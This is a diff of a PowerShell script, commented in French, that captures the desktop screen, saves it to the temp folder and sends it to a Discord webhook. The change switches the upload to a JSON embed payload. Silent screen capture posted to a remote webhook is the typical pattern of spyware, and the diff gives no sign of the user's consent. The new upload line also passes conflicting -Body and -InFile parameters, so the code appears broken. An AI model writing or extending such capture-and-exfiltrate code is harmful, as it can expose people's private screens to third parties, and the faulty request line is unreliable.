@@ -18,8 +18,20 @@ if (-not $bitmap.GetPixel(0, 0).IsEmpty) {
     # Enregistrer la capture d'écran dans le répertoire temporaire
     $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
 
-    # Envoyer la capture d'écran au webhook Discord
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $fileName -ContentType "multipart/form-data"
+    # Créer une charge utile pour l'embed Discord
+    $payload = @{
+        embeds = @(
+            @{
+                title = "Capture d'écran"
+                image = @{
+                    url = "attachment://screenshot.png"
+                }
+            }
+        )
+    }
+
+    # Envoyer la capture d'écran au webhook Discord avec l'embed
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json) -InFile $fileName -Verbose
 } else {
     Write-Host "La capture d'écran a échoué."
 }
